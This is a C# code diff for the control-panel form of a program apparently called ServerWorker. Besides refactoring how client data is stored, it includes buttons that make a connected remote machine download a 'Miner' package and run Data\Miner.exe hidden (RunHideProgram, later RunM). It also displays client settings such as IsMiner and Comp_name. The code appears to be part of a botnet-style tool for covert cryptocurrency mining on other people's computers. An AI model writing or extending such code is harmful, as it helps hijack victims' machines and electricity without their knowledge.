@@ -20,23 +20,28 @@ namespace ServerWorker
         private User user;
         private LogUserCard log;
         private PictureForm picture;
-        private UserCard.UserData userData;
+
 
         public FormUserCard(User user)
         {
             InitializeComponent();
             this.user = user;
-            userData = new UserCard.UserData();
-            try
+
+            //Запрос id, если отсутствует userData (Старая версия клиента)
+            if (user.userData == null) 
             {
-                userData.id = user.UsersCom.GetKey();
-                Log.Send("UserKey: " + userData.id);
+                try
+                {
+                    string key =  user.UsersCom.GetKey();
+                    user.userData = new UserCard.UserData(key);
+                    Log.Send("UserKey: " + user.userData.id);
+                }
+                catch (Exception ex)
+                {
+                    Log.Send("FormUserCard: " + ex.Message);
+                }
             }
-            catch(Exception ex)
-            {
-                Log.Send("FormUserCard: " + ex.Message);
-            }
-            LoadUserCard();
+            DrawUserInfoDevice();
         }
 
         private void button1_Click(object sender, EventArgs e)
@@ -66,8 +71,8 @@ namespace ServerWorker
             {
                 DrawInfoDevice(user.UsersCom.GetInfoDevice());
 
-                if (userData.id != "")
-                    userData.SaveDataToFile(userData.id + ".xml");
+                if (user.userData.id != "")
+                    user.userData.SaveDataToFile(user.userData.id + ".xml");
             }
             catch (Exception ex)
             {
@@ -79,7 +84,7 @@ namespace ServerWorker
         {
             if (listBox2.InvokeRequired) listBox2.BeginInvoke(new Action(() => { listBox2.Items.Clear(); }));
             else listBox2.Items.Clear();
-            userData.infoDevice = infoDevice;
+            user.userData.infoDevice = infoDevice;
 
             foreach (string str in infoDevice.GetListInfo())
             {
@@ -94,21 +99,11 @@ namespace ServerWorker
         }
 
 
-        private void LoadUserCard()
+        public void DrawUserInfoDevice()
         {
             try
             {
-                string[] dirs = Directory.GetFiles(UserCard.UserData.parthUserCard, "*.xml");
-                foreach (string file in dirs)
-                {
-                    if (file == UserCard.UserData.parthUserCard + @"\"+ userData.id + ".xml")
-                    {
-                        userData = userData.RearDataFromFile(file);
-                        break;
-                    }
-                }
-
-                foreach (string str in userData.infoDevice.GetListInfo())
+                foreach (string str in user.userData.infoDevice.GetListInfo())
                 {
                     try
                     {
@@ -132,20 +127,9 @@ namespace ServerWorker
             user.UsersCom.DownloadF("Miner", "Data");
         }
 
-        //private void button4_Click(object sender, EventArgs e)
-        //{
-        //    messenger.Update();
-        //}
-
-        //private void button5_Click(object sender, EventArgs e)
-        //{
-        //    string message = "RunProgram" + "_" + @"Data\Miner.exe";
-        //    messenger.SendMessage(message);
-        //}
-
         private void button4_Click_1(object sender, EventArgs e)
         {
-            user.UsersCom.RunHideProgram(@"Data\Miner.exe");
+            user.UsersCom.RunM(@"Data\Miner.exe","");
         }
 
 
@@ -197,9 +181,37 @@ namespace ServerWorker
             }
         }
 
-        private void button5_Click(object sender, EventArgs e)
+        private void button5_Click_1(object sender, EventArgs e)
         {
+            try
+            {
+                user.userData.setting = user.UsersCom.GetSetting();
+                DrawSettings();
 
+                if (user.userData.id != "")
+                    user.userData.SaveDataToFile(user.userData.id + ".xml");
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+        }
+
+        private void DrawSettings()
+        {
+            listBox2.Items.Clear();
+            listBox2.Items.Add( "<<===Comp_name===>>");
+            listBox2.Items.Add(user.userData.setting.Comp_name);
+            listBox2.Items.Add("<<===IsMiner===>>");
+            listBox2.Items.Add(user.userData.setting.IsMiner);
+            listBox2.Items.Add("<<===Key===>>");
+            listBox2.Items.Add(user.userData.setting.Key);
+            listBox2.Items.Add("<<===Open_sum===>>");
+            listBox2.Items.Add(user.userData.setting.Open_sum);
+            listBox2.Items.Add("<<===Start_time===>>");
+            listBox2.Items.Add(user.userData.setting.Start_time);
+            listBox2.Items.Add("<<===Version===>>");
+            listBox2.Items.Add(user.userData.setting.Version);
         }
     }
 }
